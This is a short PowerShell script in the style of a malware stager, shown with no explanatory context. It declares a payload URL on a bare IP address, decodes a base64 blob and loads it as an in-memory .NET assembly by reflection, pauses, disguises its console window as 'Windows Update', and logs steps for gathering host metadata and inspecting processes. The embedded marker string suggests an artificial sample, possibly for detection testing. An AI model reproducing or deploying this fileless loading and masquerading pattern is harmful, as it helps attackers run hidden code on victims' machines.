$RemoteUrl = "http://198.51.100.59/payload.bin"
$ErrorActionPreference = "Stop"

$AssemblyBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjpsenlma3Q5NGxk")
Write-Verbose ("Assembly byte count: " + $AssemblyBytes.Length)
$TransferResult = [Reflection.Assembly]::Load($AssemblyBytes)
if ($null -ne $TransferResult) {
    Write-Verbose ("Loaded assembly: " + $TransferResult.FullName)
}

Start-Sleep -Seconds 4
$Host.UI.RawUI.WindowTitle = "Windows Update"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Collecting host metadata"
Write-Verbose "Inspecting process list"
